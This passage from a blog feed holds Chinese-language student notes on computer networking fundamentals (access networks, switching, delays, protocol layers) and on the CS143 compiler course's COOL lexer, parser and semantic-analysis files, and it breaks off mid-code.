它的ISP是<strong>本地电话公司</strong>。其使用的通信链路的物理材质为电话线，是一种双绞线。</p><ul><li>用户使用<strong>DSL调制解调器</strong>通过电话线与ISP中的数字用户线接入复用器（<strong>digital subscriber line access multiplexer (DSLAM)<strong>）来交换数据；</strong>家庭DSL调制解调器</strong>将数字数据转换为高频音后通过电话线传输到ISP中心，并且通过<strong>DSL解调器</strong>将DSLAM发送过来的模拟信号转为数字信号<img src="../../image/Computer_Networking/image-20220116215009788.png" alt="image-20220116215009788" style="zoom:50%;" /></li><li><strong>CIC(Cable Internet Access)电缆因特网接入:</strong> 它的ISP是<strong>有线电视公司</strong>。其使用的通信链路的物理材质有<strong>光纤和同轴电缆</strong>，也被称为混合光纤同轴=&gt;<u>hybrid fiber coax (HFC)</u>.<ul><li>用户使用电缆调制解调器通过<strong>同轴电缆与光纤结点</strong>相连，光纤结点通过<strong>光缆与电缆头端相连</strong>，而电缆头端接入了因特网。在<strong>电缆头端</strong>，电缆调制解调器端接系统（<strong>CMTS</strong>, Cable Modem Termination System）起到<strong>DSLAM的作用</strong>，即实现模拟信号和数字信号的转换；<img src="../../image/Computer_Networking/image-20220116215023365.png" alt="image-20220116215023365" style="zoom: 50%;" /></li></ul></li><li><strong>FTTH(Fiber To The Home)光纤到户:</strong> 这里主要是指使用<strong>光纤</strong>作为通信链路的材质。<ul><li>最简单的光纤分布网络称为<strong>直接光纤</strong>，<strong>从本地中心局到每户设置一根光纤</strong>，不过更为一般的是从中心距出来的每根光纤实际上由许多家庭共享，直到相对接近这些家庭的位置，该光纤才被分成每户一根光纤。 <img src="../../image/Computer_Networking/image-20220116215036114.png" style="zoom:50%;" /></li><li>有两种: active optical networks (AONs) and passive optical networks (PONs) </li><li><strong>optical network terminator (ONT)</strong>, which is connected by dedicated optical fiber to a neighborhood splitter</li><li><strong>optical line terminator (OLT)</strong> providing conversion between optical and electrical signals, connects to the Internet via a telco router</li><li>5G fixed wireless开始被部署, 用到了beam-forming(波束成形) technology, 简单来讲就是将信号波集中在一个方向以节约能量以及提高多用户使用速率. </li></ul></li></ul></li><li><p><strong>企业（和家庭）接入：</strong> <strong>以太网和WIFI</strong></p><ul><li><strong>以太网（是局域网（LAN）中最流行的接入技术）：</strong> 接入是一种在公司、大学、家庭里很流行的接入方式；用户使用双绞线与以太网交换机相连，从而接入因特网；接入以太网交换机的速度可达100Mbps;</li><li>在无线局域网中，无线用户从一个接入点发送和接收数据，而该接入点与企业网相连，企业网最终接入因特网；在无线LAN中，用户需要在一个接入点的几十米范围之内；<img src="../../image/Computer_Networking/image-20220116215053931.png" alt="image-20220116215053931" style="zoom:50%;" /></li><li><strong>广域无线接入：</strong> 在移动设备中，通过蜂窝网提供商运营的基站来发送和接收分组，与WIFI不同的是，用户仅需要位于基站的数万米范围之内即可；</li></ul></li><li><p><strong>Wide-Area Wireless Access: 3G and LTE 4G and 5G</strong> </p><ul><li>nothing special, wait until Chapter 7.</li></ul></li></ul></li><li><p><strong>硬件设备：</strong></p><ul><li><strong>传输媒体</strong>是构成通信链路的主要部分，物理媒体通常可以分为<strong>导引性媒体</strong>和<strong>非导引性媒体</strong><ul><li><strong>导引性媒体：</strong> 信号沿着固体前行</li><li><strong>非导引性媒体中：</strong> 信号沿着固体媒体前行</li></ul></li><li><strong>双绞线twisted-pair：</strong> 最便宜的<strong>引导性</strong>传输媒体，由两条相互螺旋缠绕的铜线组成。是局域网的最佳选择.</li><li><strong>同轴电缆Coaxial cable:</strong> 借助特殊的结构和绝缘层，同轴电缆可得到较高的数据传输速率；在电视系统中应用广泛；同轴电缆可被用作 <strong>引导性</strong>的共享媒体；</li><li><strong>多模光纤缆multimode fiber-optic cable:</strong> 一种可以引导光脉冲的媒体</li><li><strong>陆地无线电频谱terrestrial radio spectrum:</strong> 无线电信道承载电磁频谱中的信号，<strong>不需要物理线路</strong>，提供与移动用户的连接以及长距离承载信号的方式；是一种有吸引力的媒体；</li><li><strong>卫星无线电频谱satellite radio spectrum:</strong> 通过卫星连接两个或多个在地球上的微波发射方（也被称为地面站），该卫星在一个频段上接收信号，在另一个频段上发送信号；种类有同步卫星和近地轨道卫星；</li></ul></li></ul><h3 id="网络核心"><a href="#网络核心" class="headerlink" title="网络核心"></a>网络核心</h3><ul><li>在考察了因特网边缘之后，开始深入研究网络核心，也就是<strong>互联网端系统的分组交换机和链路构成的网状网格</strong>。Figure 1.10</li><li>通过网络链路和交换机移动数据有两种基本方法：<strong>电路交换和分组交换</strong></li></ul><h4 id="分组交换："><a href="#分组交换：" class="headerlink" title="分组交换："></a>分组交换：</h4><ul><li>分组在通信链路上以<strong>等于该链路的最大传输速率</strong>传输通过通信链路。</li><li><strong>传输时延（应该是传播时延）：</strong> 如果某条链路的最大传输速率为<strong>R比特/秒</strong>，分组长度为<strong>L比特</strong> ，则该链路传输该分组的时间为<strong>L/R秒</strong>。</li><li><strong>存储转发传输：</strong> 存储转发是指交换机在<strong>收到一个完成的分组</strong>，才会向链路输出转发分组，否则就将收到的部分分组缓存起来；因为<strong>缓存等待一个分组的全部数据</strong>而导致的时间开销被称为<strong>存储转发时延</strong><ul><li>因为需要缓存分组，所以此时分组交换机需要一个<strong>缓冲队列</strong>；</li></ul></li><li><strong>排队时延与分组丢失：</strong><ul><li>因为需要缓存分组，所以此时分组交换机需要一个<strong>输出缓存</strong>和，也称为<strong>输出队列</strong>；<strong>缓冲队列的空间有限性</strong>就有可能导致分组交换机无法继续缓存分组（因为链路被占用（该链路正忙于传输其他分组）或者分组还没全部到位）而使到达分组交换机的数据包<strong>被迫丢弃（分组丢失）（丢包）</strong>；这就导致了分组<strong>不但承担了存储转发传输时延，还承担了排队时延</strong>。这些时延是变化的，变化的程度取决于网络的拥塞程度。</li></ul></li><li><strong>转发表与路由选择协议：</strong><ul><li>实际上，分组交换机之所以能够知道往哪去是因为其内部有一个<strong>转发表</strong>，这个表维护了一个IP地址和链路的对应关系，所以处理流程为：<ul><li>通过<strong>分组的必要信息</strong>，获得目的端系统的<strong>IP地址</strong> </li><li>通过<strong>IP地址索引转发表</strong>，从而确定输出链路</li></ul></li></ul></li></ul><h4 id="电路交换："><a href="#电路交换：" class="headerlink" title="电路交换："></a>电路交换：</h4><ul><li><p>在<strong>电路交换网络</strong>中，在端系统通信会话期间，交换机会<strong>预留</strong>端系统间通信路径上的相关资源（缓存，链路传输速率），即<strong>先建立连接，然后通信</strong>；而在<strong>分组交换网络中，这些资源没有被预留</strong>；也就是说，在端系统进行通信时，其所需要的资源是<strong>被保持</strong>的，其他通信是无法使用这一部分资源的；也就说，端系统间真正建立了一条“连接”；而这一连接，用电话的术语被称为“电路”。传统的电话网络就是电路交换网络的例子。</p></li><li><p>电路交换网络中的复用：</p><ul><li><strong>时分复用（Time-Division Multiplexing TDM）：</strong> 是指将时间划分为<strong>固定区间的帧</strong>，每个帧则又被划分为固定数量的<strong>时间空隙</strong>；当网络需要建立一条连接时，网络将在每个帧中为该连接指定一个时隙；在该时隙内，链路用来传输该链接的数据；</li><li><strong>频分复用(Frequency-Division Multiplexing)：</strong> 将频率域划分为频段，然后将<strong>频段</strong>分配给连接；此频段被用来专门传输链接的数据。该频段的宽度成为带宽。</li></ul></li><li><p><strong>分组交换和电路交换的对比：</strong></p><ul><li><strong>分组交换的优点：</strong><ul><li>它提供了比电路交换更好的带宽共享；</li><li>它比电路交换更简单、更有效、实现成本更低；</li></ul></li><li><strong>分组交换的缺点:</strong><ul><li>分组交换<strong>不适合实时服务</strong>，因为端到端的<strong>时延是可变、不可预测的</strong>，这和整个网络的情况相关；</li></ul></li><li><strong>电路交换的优点：</strong><ul><li>提供了端对端传输数据的速率保证；</li></ul></li><li><strong>电路交换的缺点</strong>：<ul><li>电路交换存在静默期，这是指专用电路空闲时，其占用的资源并没有得到充分的利用；</li><li>建立连接的过程比较复杂；</li></ul></li><li><strong>总结：</strong> 总体上来说，<strong>分组交换的性能要好于电路交换的性能</strong>，但是不同类型的分组交换方式有不同的应用场景；比如一些对最低速率有着严格要求的应用，比如实时服务等，为了获得速率保证，牺牲网络的效率也是可以接受的。趋势向着分组交换发展网络的网络</li></ul></li></ul><h4 id="网络的网络："><a href="#网络的网络：" class="headerlink" title="网络的网络："></a>网络的网络：</h4><ul><li><p>该用什么样的结构来刻画因特网呢？<strong>因特网</strong>是网络的网络</p></li><li><p>通过5个模型不断过渡到最终模型，其实过渡的过程就结构不断合理、连接方式不断明确的过程</p></li><li><p>端系统是通过<strong>ISP接入因特网</strong>的，<strong>为了实现端系统的互联，ISP也必须互联</strong>，其实网络模型就是用来<strong>表达ISP和端系统以及ISP之间的结构的抽象。</strong></p></li><li><p><strong>网络结构1：</strong> <strong>存在唯一的全球传输ISP互联所有的接入ISP</strong>，这是指，全球ISP是一个由路由器和通信链路构成的网络，该网络跨越全球，并且其他的接入ISP都至少和一个它的路由器相连（<strong>接入ISP被认为是客户</strong>，<strong>全球传输被认为是提供商</strong>）；</p></li><li><p><strong>网络结构2：</strong> <strong>存在多个全球传输ISP</strong>，它们分别于一部分的接入ISP互联；为了实现端系统的互联，这多个全球ISP也必须互联；网络结构是一个两层结构，其中<strong>全球传输ISP位于顶层</strong>，<strong>接入ISP处于底层</strong>；</p></li><li><p><strong>网络结构3：</strong> <strong>顶层全球传输ISP基本上已经定型</strong>，但是接入ISP现在还很混乱，比如，它们直接同顶层ISP相连；而网络结构3中，<strong>接入ISP也是分层的</strong>：较小区域中的ISP连入较大区域的ISP，而不是直接与顶层ISP相连；为什么会出现这样的结构呢？这是因为，如果都直接同顶层ISP相连，那么两个同一较小区域内，分属不同ISP的端系统之间通信的数据也会到顶层ISP中心去一趟，如果它们不是直接接入顶层ISP，而是接入了一个较大区域的ISP，那么它们之间的通信数据就不用去顶层ISP中心了，因为它们通过较大区域的ISP已经实现了互连，所以通信速度肯定就上去了。</p></li><li><p><strong>网络结构4</strong>: 是在网络结构3的基础上，增加了以下特点而形成的结构：<strong>存在点</strong>（Point of Presence，<strong>PoP</strong>）、<strong>多宿</strong>、<strong>对等</strong>、<strong>因特网交换点</strong>（Internet exchange point，<strong>IXP</strong>）。</p><ul><li><strong>PoP：</strong> 存在于等级结构中所有层次，但是底层ISP除外；<strong>一个PoP是ISP网络中的一台或者多台路由器群组</strong>，其中客户ISP能够通过第三方<strong>提供的高速链路直接将它的路由器和供应商的PoP连接</strong>，从而实现与提供商ISP连接。这样接入速度很明显就提高了。</li><li><strong>多宿（multi-home）：</strong> 任何ISP（除第一层ISP）都可以与<strong>两个或者多个提供商ISP连接</strong>，这被称为<strong>多宿</strong>；这样网络的<strong>可靠性</strong>就提高了。</li><li><strong>对等（peer）：</strong> 位于<strong>相同等级结构层次的一对邻近ISP能够直接将它们的网络连接到一起</strong>，使它们之间流量经直接连接而不<strong>是经过上游的中间ISP传输</strong>，这样既不用付费，速度也可能会快一些</li><li><strong>IXP：</strong> 因特网交换点是为了实现多个ISP<strong>可以对等</strong>而创建的。</li></ul></li><li><p><strong>网络结构5：</strong> 网络结构5是在网络结构4的基础上<strong>增加了内容提供商网络</strong>而构成。内容提供商构建自己的网络，并且<strong>通过与较低层ISP对等而“绕过”较高层因特网ISP</strong>，而且内容提供商对端用户也有了更多的控制。</p><img src="../../image/Computer_Networking/image-20220116215250646.png" alt="image-20220116215250646" style="zoom:67%;" /></li><li><p>总体来说，今天的因特网是一个“网络的网络”，其结构复杂，由十多个顶层ISP和数十万个较低层ISP构成。近年来，<strong>主要的内容提供商创建自己的网络，直接在可能的地方与较低层ISP互联.</strong></p></li></ul><h3 id="分组交换中的时延、丢包、吞吐量"><a href="#分组交换中的时延、丢包、吞吐量" class="headerlink" title="分组交换中的时延、丢包、吞吐量:"></a>分组交换中的时延、丢包、吞吐量:</h3><ul><li><p>因特网能够看成是一种基础设施，该基础设施为运行在端系统上的分布式应用提供服务。</p></li><li><p><strong>理想目标</strong>：因特网能够在任意两个端系统之间随心所欲地移动数据而没有任何数据丢失，<strong>计算机网络必定要限制在端系统之间的吞吐量（每秒能够传输的数据量），在端系统之间引入时延，而且实际上也会丢失分组</strong></p></li></ul><h4 id="分组交换网中的时延概述："><a href="#分组交换网中的时延概述：" class="headerlink" title="分组交换网中的时延概述："></a>分组交换网中的时延概述：</h4><ul><li>一个分组在沿途每个节点<strong>承受不同类型的时延</strong>，这些时延中最为重要的是：结点<strong>处理时延、排队时延、传输时延</strong>和<strong>传播时延</strong>.这些时延总体累加起来是<strong>结点总时延</strong></li><li><strong>节点总时延==结点处理时延+排队时延+传输时延+传播时延</strong></li><li><strong>时延类型：</strong><ul><li><strong>节点处理时延nodal processing delay：</strong> 是因为节点需要解析分组的必要信息然后决定是哪个出链路（索引转发表等操作）而产生的，通常在微秒或者更低数量级；</li><li><strong>排队时延queuing delay：</strong> 是因为分组所对应的出链路前面有其他分组正在传输，所以分组需要该链路的缓冲队列里等待其他分组传输完毕而产生的，一个特定分组的排队时延长度将取决于先前到达的正在排队等待向链路传输的分组数量。排队时延是到达该队列的流量强度和性质的函数，通常可以达到毫秒级到微秒级；</li><li><strong>传输时延transmission delay(一个分组的节点全部进入链路的时延)：</strong> 传输时延是将<strong>所有分组的比特推向链路所有需要的时间</strong>，实际的传输时延通常在毫秒到微秒数量级。用L表示分组的长度，用Rbps表示从路由器A到B的链路传输速率。传输时延是L/R。</li><li><strong>传播时延propagation delay(链路中消耗的)：</strong> 是指<strong>比特进入链路后，从该链路的起点到下一个结点所用的时间</strong>；一旦分组中的最后一个比特到达路由器就意味着该分组的所有比特都已到达路由器；广域网中，传播时延一般是毫秒级的。<strong>传播时延是d/s</strong>。d是路由器A到B的距离。s是链路的传播速率。</li></ul></li><li>传输时延和传播时延的对比：<ul><li>传输时延：大卡车经过收费站的时间（分组长度L <strong>/</strong> 链路的传输速率）</li><li>传播时延：大卡车在高速上行驶的时间（两台路由器之间的链路长度d <strong>/</strong> 两台路由器之间的传输速率）</li></ul></li></ul><h4 id="排队时延和丢包："><a href="#排队时延和丢包：" class="headerlink" title="排队时延和丢包："></a>排队时延和丢包：</h4><ul><li>丢包Packet Loss：到达的分组发现一个满的队列。由于没有地方存储这个分组，路由器将丢弃该分组，该分组将会丢失。<ul><li>排队时延和丢包与网络的状况和结点的缓冲空间大小、处理速度相关；</li><li>如果分组到达的速度 <strong>&gt;</strong> 结点的处理速度，那么分组就会在缓冲队列里排队等待。</li><li>为了描述网络状态，我们引入了<strong>流量强度traffic intensity</strong>这一概念：<strong>流量强度=分组到达的速度 / 结点的处理速度</strong>；</li><li>流量工程里一个金科玉律就是：设计系统时<strong>流量强度&lt;=1</strong>，流量强度持续大于1时，就将出现<strong>丢包</strong>现象</li></ul></li></ul><h4 id="端到端时延："><a href="#端到端时延：" class="headerlink" title="端到端时延："></a>端到端时延：</h4><ul><li><strong>端到端时延 ==(节点总时延 * (路由器个数+1) )== （结点处理时延+排队时延+传输时延+传播时延）*（路由器个数+1）</strong></li></ul><h4 id="计算机网络的吞吐量："><a href="#计算机网络的吞吐量：" class="headerlink" title="计算机网络的吞吐量："></a>计算机网络的吞吐量：</h4><ul><li>计算机网络的吞吐量实际上是一个速度指标，它描述了<strong>比特经过某个节点的速度</strong> </li><li><strong>某节点的吞吐量 == min(发送数据的速度，接收数据的速度)</strong> </li><li><strong>任何时间的瞬时吞吐量：</strong> 是主机<strong>接受</strong>到该文件的速率</li><li><strong>平均吞吐量：</strong> 该分组的L比特 <strong>/</strong> 主机接收该分组所有的比特用去的时间T</li><li>吞吐量可以近似为源和目的地之间路径的最小传输速率。<strong>最小传输速率的链路为瓶颈链路</strong>。</li><li>在今天，<strong>因特网对吞吐率的限制因素通常是接入网</strong>。</li></ul><h3 id="协议层次及其服务模型："><a href="#协议层次及其服务模型：" class="headerlink" title="协议层次及其服务模型："></a>协议层次及其服务模型：</h3><ul><li>因特网是一个极为复杂的系统，该系统里存在着大量的应用程序和协议、各种类型的端系统、分组交换机和各种类型的链路级媒体。但是它同时也是有着清晰结构的，就像我们前面在网络核心 一节介绍的，我们仍能构建它的结构模型</li></ul><h4 id="分层体系结构"><a href="#分层体系结构" class="headerlink" title="分层体系结构"></a>分层体系结构</h4><ul><li>优点：<ul><li>易于服务实现的多样性,因为某一层对其上一层提供服务，同时它可以利用下一层提供的服务，只要对上提供的服务和对下利用的服务没有变化，其层内部的实现并不会对系统结构产生影响，也就是对于大而复杂且需要不断更新的系统来说 改变服务的实现而不会影响系统其他组件。 </li><li>不用关注下一层如何实现，以及处理故障的细节。</li><li>协议分层具有<strong>概念化和结构化</strong>：<strong>使得模块化使更新系统组件更为容易</strong>。</li></ul></li><li>缺点：<ul><li><strong>功能上的冗余，</strong> 比如许多协议栈针对链路和端到端两种情况都提供了<strong>差错恢复功能</strong></li><li><strong>某层的功能可能需要仅在其它层才能出现的信息，这违反了层次分离的目标</strong></li></ul></li><li>总体来说，将各层的所有协议组合起来，称为协议栈。因特网的协议栈有5个层次组成：物理层、链路层、网络成、传输层、应用层。<ul><li><strong>应用层：</strong> 应用层协议分布在<strong>多个端系统</strong>，端系统中的<strong>应用程序使用该协议与另一个端系统中的应用程序</strong>通信。处于应用层的<strong>分组</strong>称为<strong>报文。</strong></li><li><strong>传输层：</strong> 传输层在应用程序<strong>端点</strong>之间传输应用层报文，因特网中有两个传输层协议：==TCP和UDP==。处于传输层的分组称为<strong>报文段</strong>。TCP提供确保传递、流量控制、拥塞控制机制。UDP提供<strong>无连接</strong>服务，即<strong>不提供不必要服务的服务</strong>, 没有可靠性、没有流量和拥塞控制。</li><li><strong>网络层：</strong> 网络层将称为<strong>数据报</strong>的网络层分组<strong>从一台主机移动到另一台主机</strong>。网络层协议包含著名的IP协议以及其他一些路由选择协议。</li><li><strong>链路层：</strong> 链路层将称为<strong>帧</strong>的链路层分组<strong>从一个结点移动到路径上的另一个结点</strong>。一个帧可能被沿途不同链路上的不同链路层协议处理。</li><li><strong>物理层：</strong> 物理层的任务是将<strong>帧中的比特从一个结点移动到 下一个节点</strong>，它提供了传输信息的实际物理通道；</li></ul></li><li>OSI模型：<ul><li>在<strong>因特网协议栈</strong>出现以前，<strong>OSI模型</strong>是ISO（国际标准化组织）组织研发的计算机网络结构模型。</li><li>OSI的模型一共有7层；</li><li>从下到上依次为：<strong>物理层，链路层，网络层，传输层，会话层，表示层，应用层</strong>。相比因特网体系结构，OSI多了两层。</li><li><strong>因特网</strong>将两层 <strong>（会话层，表示层）</strong> 的功能留给了<strong>开发者自行实现</strong>。</li></ul></li></ul><h4 id="封装："><a href="#封装：" class="headerlink" title="封装："></a>封装：</h4><ul><li>一个分组，在不同的层次有不同的称谓，是因为它们<strong>经过每一层（自上至下）的时候就被该层封装上了属于该层的相关信息</strong>，也就是前面提到的 <strong>（分组中的）必要信息</strong> ；于是，每一分层的分组有<strong>两种类型的字段</strong>：<strong>首部字段和有效负载</strong>；其中<strong>有效负载即为来自上一层的分组数据</strong>，而<strong>首部字段就是该层加上的必要信息</strong>；分组<strong>不断被封装（也就是不断地加首部字段，也就是必要信息）</strong> 以实现各层协议规定的相关功能。</li></ul><h3 id="Networks-Under-Attack"><a href="#Networks-Under-Attack" class="headerlink" title="Networks Under Attack"></a>Networks Under Attack</h3><ul><li>The Bad Guys Can Put Malware into Your Host Via the Internet</li><li>The Bad Guys Can Attack Servers and Network Infrastructure</li><li>The Bad Guys Can Sniff Packets</li><li>The Bad Guys Can Masquerade as Someone You Trust</li></ul><p>We should seek defenses against sniffing, end-point masquerading, man-in-the-middle attacks, DDoS attacks, malware, and more.</p><h2 id="第二章-应用层"><a href="#第二章-应用层" class="headerlink" title="第二章:应用层"></a>第二章:应用层</h2><blockquote><p>还是自己做思维导图吧, 真像以前那样子做的话笔记会详细的过于恐怖了.</p><p>书上是从零开始引导式的, 所以会比较详细.</p><p>(我特么真能写, 真的好多, 不过复习起来也挺爽的)</p></blockquote><p><img src="../../image/Computer_Networking/Computer_Networks.png" alt="Computer_Networks"></p><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><p><img src="../../image/Computer_Networking/Chapter3.png" alt="Chapter3"></p><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><p><img src="../../image/Computer_Networking/Chapter4.png" alt="Chapter4"></p><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><p><img src="../../image/Computer_Networking/Chapter5.png" alt="Chapter5"></p><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><p><img src="../../image/Computer_Networking/Chapter6.png" alt="Chapter6"></p><h2 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h2><p><img src="../../image/Computer_Networking/Chapter7.png" alt="Chapter7"></p><h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><p><img src="../../image/Computer_Networking/Chapter8.png" alt="Chapter8"></p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译原理complier</title>
    <link href="/2021-10/Learning-complier/"/>
    <url>/2021-10/Learning-complier/</url>
    
    <content type="html"><![CDATA[<h1 id="COMPLIER-CS143"><a href="#COMPLIER-CS143" class="headerlink" title="COMPLIER-CS143"></a>COMPLIER-CS143</h1><h2 id="0-预备知识"><a href="#0-预备知识" class="headerlink" title="0. 预备知识"></a>0. 预备知识</h2><h3 id="COOL语言"><a href="#COOL语言" class="headerlink" title="COOL语言"></a>COOL语言</h3><ul><li>只能说是比较复杂, manuals和源码分析详见相关文档</li><li>比较典型的是继承树结构</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">          &#123; -&gt; [String]<br>          &#123; -&gt; [Int]<br>[OBJECT] =&#123; -&gt; [IO]     -&gt; [B]<br>          &#123; -&gt; [Bool]<br>          &#123; -&gt; [A]<br></code></pre></div></td></tr></table></figure><h3 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h3><ul><li>词法分析-&gt;语法分析-&gt;语义分析</li><li><img src="https://i.loli.net/2021/11/15/AlBoJu85kTGY1FX.png" alt="image-20211013100444035" style="zoom:67%;" /> </li><li><strong>词法分析</strong> <ul><li>从左向右逐行扫描源程序的字符，识别出各个单词，确定单词的类型。将识别出的单词转换成统一的机内表示——词法单元(<strong>token</strong>)形式</li></ul></li><li><strong>语法分析</strong> <ul><li>语法分析器(parser)从词法分析器输出的token序列中识别出各类短语，并构造语法分析树(<strong>parse tree</strong>)</li></ul></li><li><strong>语义分析</strong> <ul><li>收集标识符的属性信息&amp;&amp;语义检查</li></ul></li><li><strong>中间代码</strong> <ul><li>三地址码 (Three-address Code)<div class="hljs code-wrapper"><pre><code>三地址码由类似于汇编语言的指令序列组成，每个指令最多有三个操作数(operand)</code></pre></div></li><li>语法结构树/语法树 (Syntax Trees)</li></ul></li></ul><h3 id="CS143实验文件结构"><a href="#CS143实验文件结构" class="headerlink" title="CS143实验文件结构"></a>CS143实验文件结构</h3><h4 id="list-h"><a href="#list-h" class="headerlink" title="list.h:"></a>list.h:</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">List</span> &#123;</span><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">//可以看到这个list的head是一个元素T, 而另一个是指向List&lt;T&gt;类的指针</span><br>    <span class="hljs-comment">//和平常的单链表是一样的结构</span><br>T *head;<br>    List&lt;T&gt;* tail;<br>    ...<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="tree-h-cool-tree-h"><a href="#tree-h-cool-tree-h" class="headerlink" title="tree.h+cool-tree.h:"></a>tree.h+cool-tree.h:</h4><ul><li>All APS nodes are derived from tree_node.</li><li>Lists of APS objects are implemented by the “list_node” template.</li><li>Class_, Feature, Expression等等都是指向constructor的指针</li></ul><pre><code class=" mermaid">classDiagramclass tree_node&#123;    int line_number       tree_node()    virtual tree_node *copy() = 0    virtual void dump(ostream&amp; stream, int n) = 0    int get_line_number()    tree_node *set(tree_node *)&#125;class list_node&#123;实现了三个返回下标的迭代器&#125;class append_node&#123;nil_nodesingle_list_node以上三个实现了取出第n个node()&#125;tree_node --|&gt; list_nodelist_node --|&gt; append_nodeclass Class__class&#123;    virtual get_name()    virtual get_parent()    virtual get_features()    virtual get_filename()    virtual dump_with_types(ostream&amp;,int)&#125;Class__class : define simple_phylum_Class_class class__class&#123;   Symbol name;   Symbol parent;   Features features;   Symbol filename;&#125;Class__class --|&gt; class__classtree_node --|&gt; Class__classtree_node --|&gt; Feature_classclass Feature_class&#123;全为纯虚函数:dump_with_types(ostream&amp;,int) = 0Symbol get_name()tc(EnvironmentP)add_to_table(EnvironmentP)&#125;class method_class&#123;    Symbol name;    Formals formals;    Symbol return_type;    Expression expr;    get_return_type()    get_formals()    ...&#125;class attr_class&#123;   Symbol name;   Symbol type_decl;   Expression init;&#125;Feature_class --|&gt; method_classFeature_class --|&gt; attr_classtree_node --|&gt; Formal_classtree_node --|&gt; Case_classtree_node --|&gt; Expression_class</code></pre><h4 id="stringtable"><a href="#stringtable" class="headerlink" title="stringtable:"></a>stringtable:</h4><ul><li>Symbol是指向<strong>Entry</strong>的指针</li></ul><pre><code class=" mermaid">classDiagramdirection RLclass Entry&#123;   Symbol name;   Symbol type_decl;   Expression init;&#125;Entry --|&gt; StringEntryEntry --|&gt; IntEntryEntry --|&gt; IdEntryclass StringTable~Elem~&#123;   List~Elem~ *tbl;   int index;&#125;StringTable .. Entry</code></pre><h4 id="symtab"><a href="#symtab" class="headerlink" title="symtab:"></a>symtab:</h4><pre><code class=" mermaid">classDiagramclass SymtabEntry&#123;    SYM id;    // the key field    DAT *info;    get_id()    get_info()&#125;class SymbolTable~SYM, DAT~&#123;    SymtabEntry~SYM, DAT~=ScopeEntry;    List~ScopeEntry~=Scope;    List~Scope~=ScopeList;private:    ScopeList *tbl;&#125;SymtabEntry .. SymbolTable</code></pre><h2 id="1-lexer-词法分析"><a href="#1-lexer-词法分析" class="headerlink" title="1. lexer - 词法分析"></a>1. lexer - 词法分析</h2><ul><li><p>这一实验看上去就是逐字分析然后根据flex的语法返回token就完事了, 但要知道的是flex的内部原理仍然是有穷自动机finite automate, 具体概念可以看看课程PDF, flex的代码分析可见 <a href="https://github.com/pcy190/CompilerAnalysis/blob/master/flex_analysis.md">这里</a>, 肖哥的分析在 <a href="https://github.com/Kiprey/Skr_Learning/tree/master/week3-6#1-lexer---%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90">这里</a> </p></li><li><p>文件关系:</p><ul><li>lexertest.cc是main函数所在文件, 我们写完cool.flex后flex使用此文件和众多依赖文件编译成lexer(executable)</li><li>cool-lex.cc即为flex自动生成的词法扫描自动机</li></ul></li></ul><h2 id="2-parser-语法分析"><a href="#2-parser-语法分析" class="headerlink" title="2.parser - 语法分析"></a>2.parser - 语法分析</h2><ul><li>此阶段主要任务是构建AST树</li><li>文件关系:<ul><li>parser-phase.cc是main函数所在文件, 调用cool_yyparse函数</li><li>把词法分析编译出的lexer文件放进此PA的文件夹中完成词法分析</li><li>cool.y为我们要编写的bison文件, cool-parse.cc为bison自动生成的源文件, parser为可执行文件</li></ul></li><li> If no parent is specified, the class inherits from the Object class. </li></ul><h2 id="3-semantic-语义分析"><a href="#3-semantic-语义分析" class="headerlink" title="3.semantic - 语义分析"></a>3.semantic - 语义分析</h2><ul><li>semant.h结构</li></ul><pre><code class=" mermaid">classDiagramclass InheritanceNodeclass ClassTableInheritanceNode &lt;|-- class__classClassTable &lt;|-- SymbolTable~Symbol, InheritanceNode~class Environment&#123;    SymbolTable~Symbol, method_class~ method_table;    SymbolTable~Symbol, Entry~  var_table;    ClassTableP class_table;    Class_      self_class;    method表操作函数    variable表操作函数    type操作函数&#125;InheritanceNode : 该class的信息和environmentclass ClassTable &#123; 文件中所有class检查完之后进入ClassTable的构造函数,&#125;</code></pre><p>先看semant-parse.cc入口main函数</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> Program ast_root;      <span class="hljs-comment">// root of the abstract syntax tree</span><br>FILE *ast_file = stdin;       <span class="hljs-comment">// we read the AST from standard input</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">ast_yyparse</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>; <span class="hljs-comment">// entry point to the AST parser</span><br><span class="hljs-keyword">int</span> cool_yydebug;     <span class="hljs-comment">// not used, but needed to link with handle_flags</span><br><span class="hljs-keyword">char</span> *curr_filename;<br><span class="hljs-function"><span 